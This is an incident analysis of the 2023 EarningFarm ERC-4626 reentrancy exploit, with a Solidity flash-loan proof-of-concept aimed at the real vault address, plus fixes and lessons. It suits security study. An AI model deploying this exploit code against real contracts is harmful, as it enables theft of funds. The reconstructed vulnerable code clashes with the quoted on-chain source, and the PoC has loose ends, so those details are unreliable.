# EarningFarm Reentrancy Attack Incident Analysis

## 1. Overview

| Item | Details |
|------|------|
| Project | EarningFarm (ENF_ETHLEV) |
| Date | 2023-08-28 |
| Chain | Ethereum Mainnet |
| Loss | ~$286,000 USD |
| Attack Type | Flash Loan + ERC-4626 Reentrancy |
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Attacker Address | `0xee4b3dd20902fa3539706f25005fa51d3b7bdf1b` |
| Attack Contract | `0xfe141c32e36ba7601d128f0c39dedbe0f6abb983` |
| Vulnerable Contract | `0x863e572b215fd67c855d973f870266cf827aea5e` (ENF_ETHLEV) |
| Fork Block | 17,875,885 |

## 2. Vulnerable Code Analysis

`ENF_ETHLEV` was a contract implementing the ERC-4626 Vault pattern. Reentrancy was possible during the ETH transfer in the `withdraw()` function. The attacker minted shares via `deposit()`, then during a `withdraw()` call, re-invoked `withdraw()` from the ETH receive callback to execute a double withdrawal.

```solidity
// Vulnerable pattern: reentrancy possible in ERC-4626 withdraw
contract ENF_ETHLEV is ERC4626 {
    // Vulnerable: state update after ETH transfer (CEI violation)
    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) public override returns (uint256 shares) {
        shares = previewWithdraw(assets);

        // Vulnerable: ETH sent first (reentrancy entry point)
        (bool success,) = receiver.call{value: assets}("");
        require(success, "ETH transfer failed");

        // State update after ETH transfer — CEI violation
        _burn(owner, shares);
        totalAssets -= assets;

        emit Withdraw(msg.sender, receiver, owner, assets, shares);
    }
}
```

**Vulnerability**: The `withdraw()` function was implemented in Interactions → Effects order — transferring ETH to the receiver before burning shares — violating the CEI (Checks-Effects-Interactions) pattern. When the attacker's contract called `withdraw()` again from its `receive()` function upon receiving ETH, additional withdrawals were possible using shares that had not yet been burned.

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: ReentrancyGuardUpgradeable.sol
 * @dev Contract module that helps prevent reentrant calls to a function.

// ...

    function __ReentrancyGuard_init() internal onlyInitializing {  // ❌
        __ReentrancyGuard_init_unchained();  // ❌
    }

// ...

    function __ReentrancyGuard_init_unchained() internal onlyInitializing {  // ❌
        _status = _NOT_ENTERED;
    }

// ...

     * `private` function that does the actual work.
```

```solidity
// File: Vault.sol
import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";  // ❌

// ...

contract EFVault is IVault, Initializable, ERC20Upgradeable, OwnableUpgradeable, ReentrancyGuardUpgradeable {  // ❌
    using SafeERC20Upgradeable for ERC20Upgradeable;
    using SafeMath for uint256;

    ERC20Upgradeable public asset;

    string public constant version = "3.0";

    address public controller;

    address public subStrategy;

    uint256 public maxDeposit;

    uint256 public maxWithdraw;

    bool public paused;

    event Deposit(address indexed asset, address indexed caller, address indexed owner, uint256 assets, uint256 shares);

    event Withdraw(
        address indexed asset,
        address indexed caller,
        address indexed owner,
        uint256 assets,
        uint256 shares,
        uint256 fee
    );

    event SetMaxDeposit(uint256 maxDeposit);

    event SetMaxWithdraw(uint256 maxWithdraw);

    event SetController(address controller);

    event SetDepositApprover(address depositApprover);

    event SetSubStrategy(address subStrategy);

    receive() external payable {}

    modifier unPaused() {
        require(!paused, "PAUSED");
        _;
    }

    modifier onlySS() {
        require(subStrategy == _msgSender(), "ONLY_SUBSTRATEGY");
        _;
    }

    function initialize(
        ERC20Upgradeable _asset,
        string memory _name,
        string memory _symbol
    ) public initializer {
        __ERC20_init(_name, _symbol);
        __Ownable_init();
        __ReentrancyGuard_init();  // ❌
        asset = _asset;
        maxDeposit = type(uint256).max;
        maxWithdraw = type(uint256).max;

// ...

    function initialize(
```

```solidity
// File: AddressUpgradeable.sol
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }
```

## 3. Attack Flow

```
Attacker [0xee4b3dd20902fa3539706f25005fa51d3b7bdf1b]
  │
  ├─1─▶ Pair.flash() - Uniswap V3 Flash Loan
  │      [Uni_Pair_V3: WETH-USDC pool]
  │      Borrow large amount of WETH
  │
  ├─2─▶ WETH.withdraw() - Convert WETH → ETH
  │      [WETH: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
  │
  ├─3─▶ ENF_ETHLEV.approve(exploiter, shares)
  │      [ENF_ETHLEV: 0x863e572b215fd67c855d973f870266cf827aea5e]
  │
  ├─4─▶ ENF_ETHLEV.deposit(ETH) - Mint shares
  │      Check current ratio via convertToAssets()
  │
  ├─5─▶ ENF_ETHLEV.withdraw() call - Reentrancy begins
  │      └─ receive() callback upon receiving ETH
  │           └─ exploiter.withdraw() called again
  │                → Additional withdrawal using unburned shares
  │                └─ Recursive repetition...
  │
  ├─6─▶ WETH.deposit() - Convert ETH → WETH
  │
  └─7─▶ WETH.transfer() - Repay flash loan
         ~$286,000 profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IENF_ETHLEV is IERC20 {
    function deposit(uint256 assets, address receiver) external payable returns (uint256 shares);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
}

contract Exploiter {
    IENF_ETHLEV enfEthlev = IENF_ETHLEV(0x863e572b215fd67c855d973f870266cf827aea5e);
    uint256 reentrancyCount;

    function withdraw() external {
        uint256 assets = enfEthlev.convertToAssets(enfEthlev.balanceOf(address(this)));
        enfEthlev.withdraw(assets, address(this), address(this));
    }

    receive() external payable {
        // Reentrancy: re-invoke while shares have not yet been burned
        if (reentrancyCount < 3 && enfEthlev.balanceOf(address(this)) > 0) {
            reentrancyCount++;
            uint256 assets = enfEthlev.convertToAssets(enfEthlev.balanceOf(address(this)));
            enfEthlev.withdraw(assets, address(this), address(this));
        }
    }
}

contract EarningFarmExploit {
    IENF_ETHLEV enfEthlev = IENF_ETHLEV(0x863e572b215fd67c855d973f870266cf827aea5e);
    IWFTM WETH = IWFTM(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Pair_V3 pair;
    Exploiter exploiter;

    function testExploit() external {
        exploiter = new Exploiter();

        // Uniswap V3 flash loan
        pair.flash(address(this), 200 ether, 0, "");
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        // WETH → ETH
        WETH.withdraw(200 ether);

        // Deposit ETH into ENF_ETHLEV — mint shares
        enfEthlev.approve(address(exploiter), type(uint256).max);
        enfEthlev.deposit{value: 200 ether}(200 ether, address(exploiter));

        uint256 shares = enfEthlev.convertToShares(enfEthlev.convertToAssets(enfEthlev.balanceOf(address(exploiter))));
        enfEthlev.approve(address(exploiter), shares);

        // Execute reentrancy attack
        exploiter.withdraw();

        // ETH → WETH
        WETH.deposit{value: address(this).balance}();

        // Repay flash loan
        WETH.transfer(address(pair), 200 ether + fee0);
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification

| Item | Details |
|------|------|
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Vulnerability Type | ERC-4626 withdraw reentrancy, CEI pattern violation |
| Impact Scope | All ETH assets in the ENF_ETHLEV Vault |
| Explorer | [Etherscan](https://etherscan.io/address/0x863e572b215fd67c855d973f870266cf827aea5e) |

## 6. Security Recommendations

```solidity
// Fix 1: Apply CEI pattern + ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract ENF_ETHLEV is ERC4626, ReentrancyGuard {
    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) public override nonReentrant returns (uint256 shares) {
        shares = previewWithdraw(assets);

        // Effects first
        _burn(owner, shares);
        totalAssets -= assets;

        emit Withdraw(msg.sender, receiver, owner, assets, shares);

        // Interactions last
        (bool success,) = receiver.call{value: assets}("");
        require(success, "ETH transfer failed");
    }
}

// Fix 2: Pull pattern for ETH transfers
mapping(address => uint256) public pendingWithdrawals;

function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {
    shares = previewWithdraw(assets);
    _burn(owner, shares);
    totalAssets -= assets;

    // Add to withdrawal queue instead of direct transfer
    pendingWithdrawals[receiver] += assets;
}

function claimWithdrawal() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "No pending withdrawal");
    pendingWithdrawals[msg.sender] = 0;
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "ETH transfer failed");
}
```

## 7. Lessons Learned

1. **ERC-4626 and ETH Transfers**: A `withdraw()` implementation that directly transfers ETH in an ERC-4626 Vault is particularly vulnerable to reentrancy. State must be updated (shares burned) before the ETH transfer.
2. **Importance of the CEI Pattern**: The Checks-Effects-Interactions pattern is the most fundamental defense against reentrancy attacks. All state changes must be completed before any ETH transfer or external contract call.
3. **ReentrancyGuard is Mandatory**: OpenZeppelin's `ReentrancyGuard.nonReentrant` must always be applied to functions that transfer ETH.
4. **ERC-4626 Security**: The ERC-4626 standard does not explicitly account for reentrancy risks in ETH-based Vaults. This vulnerability must be defended against separately during implementation.